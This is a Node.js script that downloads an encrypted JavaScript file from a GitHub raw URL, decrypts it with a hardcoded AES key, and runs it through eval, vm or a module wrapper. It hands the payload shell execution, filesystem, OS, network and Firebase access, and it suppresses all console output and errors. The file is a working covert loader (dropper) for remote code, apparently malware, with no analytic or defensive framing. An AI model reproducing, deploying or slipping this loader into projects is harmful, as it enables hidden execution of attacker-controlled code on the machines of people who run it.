const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const https = require('https');
const http = require('http');

const ENCRYPTED_FILE_URL = 'https://raw.githubusercontent.com/boneng-cell/data/main/data/a_encrypted.js';

function decryptAndExecute() {
    const keyData = {
        key: "bcaae641e671c9fb6f29ca05f55426a6d7077ec78e02b551bf1f8e83c9efaa13",
        iv: "af2e58017194b2d2ba4aaafddf4d3b89"
    };
    const key = Buffer.from(keyData.key, 'hex');
    const iv = Buffer.from(keyData.iv, 'hex');
    downloadFromUrl(ENCRYPTED_FILE_URL)
        .then(encryptedData => {
            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
            let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            executeDecryptedCode(decrypted, 'downloaded_script.js');
        })
        .catch(error => {
            process.exit(1);
        });
}

function downloadFromUrl(url) {
    return new Promise((resolve, reject) => {
        const protocol = url.startsWith('https') ? https : http;
        protocol.get(url, (response) => {
            if (response.statusCode !== 200) {
                reject(new Error(`HTTP ${response.statusCode}: ${response.statusMessage}`));
                return;
            }

            let data = '';
            response.setEncoding('hex');

            response.on('data', (chunk) => {
                data += chunk;
            });

            response.on('end', () => {
                resolve(data);
            });
        }).on('error', (error) => {
            reject(error);
        });
    });
}

function executeDecryptedCode(code, filename) {
    try {
        simpleEvalExecution(code, filename);
    } catch (error) {
        try {
            vmExecution(code, filename);
        } catch (vmError) {
            try {
                dynamicRequireExecution(code, filename);
            } catch (requireError) {
            }
        }
    }
}

function simpleEvalExecution(code, filename) {
    const context = {
        require: require,
        exports: {},
        module: { exports: {} },
        __filename: filename,
        __dirname: path.dirname(filename),
        process: Object.assign({}, process, {
            stdout: { write: () => {} },
            stderr: { write: () => {} }
        }),
        console: {
            log: () => {},
            error: () => {},
            warn: () => {},
            info: () => {},
            debug: () => {},
            trace: () => {}
        },
        Buffer: Buffer,
        setImmediate: setImmediate,
        clearImmediate: clearImmediate,
        setInterval: setInterval,
        clearInterval: clearInterval,
        setTimeout: setTimeout,
        clearTimeout: clearTimeout,
        global: global,
        initializeApp: require('@firebase/app').initializeApp,
        getDatabase: require('@firebase/database').getDatabase,
        ref: require('@firebase/database').ref,
        onValue: require('@firebase/database').onValue,
        update: require('@firebase/database').update,
        get: require('@firebase/database').get,
        exec: require('child_process').exec,
        execSync: require('child_process').execSync,
        spawn: require('child_process').spawn,
        fs: fs,
        path: path,
        os: require('os'),
        https: require('https'),
        http: require('http')
    };

    const boundContext = {};
    for (const [key, value] of Object.entries(context)) {
        if (typeof value === 'function') {
            boundContext[key] = value.bind(context);
        } else {
            boundContext[key] = value;
        }
    }

    const evalCode = `
        (function() {
            const { initializeApp } = require('@firebase/app');
            const { getDatabase, ref, onValue, update, get } = require('@firebase/database');
            const { exec, execSync, spawn } = require('child_process');
            const fs = require('fs');
            const path = require('path');
            const os = require('os');
            const https = require('https');
            const http = require('http');
            ${code}
        })();
    `;
    const originalConsole = Object.assign({}, console);
    const originalStdout = process.stdout.write;
    const originalStderr = process.stderr.write;
    console.log = console.error = console.warn = console.info = console.debug = console.trace = () => {};
    process.stdout.write = process.stderr.write = () => {};
    try {
        eval(evalCode);
    } finally {
        Object.assign(console, originalConsole);
        process.stdout.write = originalStdout;
        process.stderr.write = originalStderr;
    }
}

function vmExecution(code, filename) {
    const context = {
        require: require,
        exports: {},
        module: { exports: {} },
        __filename: filename,
        __dirname: path.dirname(filename),
        process: Object.assign({}, process, {
            stdout: { write: () => {} },
            stderr: { write: () => {} }
        }),
        console: {
            log: () => {},
            error: () => {},
            warn: () => {},
            info: () => {},
            debug: () => {},
            trace: () => {}
        },
        Buffer: Buffer,
        setImmediate: setImmediate,
        clearImmediate: clearImmediate,
        setInterval: setInterval,
        clearInterval: clearInterval,
        setTimeout: setTimeout,
        clearTimeout: clearTimeout,
        global: global
    };
    context.initializeApp = require('@firebase/app').initializeApp;
    context.getDatabase = require('@firebase/database').getDatabase;
    context.ref = require('@firebase/database').ref;
    context.onValue = require('@firebase/database').onValue;
    context.update = require('@firebase/database').update;
    context.get = require('@firebase/database').get;
    context.exec = require('child_process').exec;
    context.execSync = require('child_process').execSync;
    context.spawn = require('child_process').spawn;
    context.fs = fs;
    context.path = path;
    context.os = require('os');
    context.https = require('https');
    context.http = require('http');
    const script = new vm.Script(code, {
        filename: filename,
        displayErrors: true
    });
    vm.createContext(context);
    const originalConsole = Object.assign({}, console);
    const originalStdout = process.stdout.write;
    const originalStderr = process.stderr.write;
    console.log = console.error = console.warn = console.info = console.debug = console.trace = () => {};
    process.stdout.write = process.stderr.write = () => {};
    try {
        script.runInContext(context, {
            displayErrors: true,
            timeout: 30000
        });
    } finally {
        Object.assign(console, originalConsole);
        process.stdout.write = originalStdout;
        process.stderr.write = originalStderr;
    }
}

function dynamicRequireExecution(code, filename) {
    const tempModule = {
        exports: {},
        filename: filename,
        id: filename,
        loaded: false,
        children: [],
        paths: require('module')._nodeModulePaths(path.dirname(filename))
    };
    const wrapper = require('module').wrap(code);
    const compiledWrapper = vm.runInThisContext(wrapper, {
        filename: filename,
        displayErrors: true
    });
    const originalConsole = Object.assign({}, console);
    const originalStdout = process.stdout.write;
    const originalStderr = process.stderr.write;
    console.log = console.error = console.warn = console.info = console.debug = console.trace = () => {};
    process.stdout.write = process.stderr.write = () => {};
    try {
        compiledWrapper.call(
            tempModule.exports,
            tempModule.exports,
            require,
            tempModule,
            filename,
            path.dirname(filename)
        );
        tempModule.loaded = true;
        return tempModule.exports;
    } finally {
        Object.assign(console, originalConsole);
        process.stdout.write = originalStdout;
        process.stderr.write = originalStderr;
    }
}

if (require.main === module) {
    try {
        decryptAndExecute();
    } catch (error) {
        process.exit(1);
    }
}

module.exports = { decryptAndExecute };
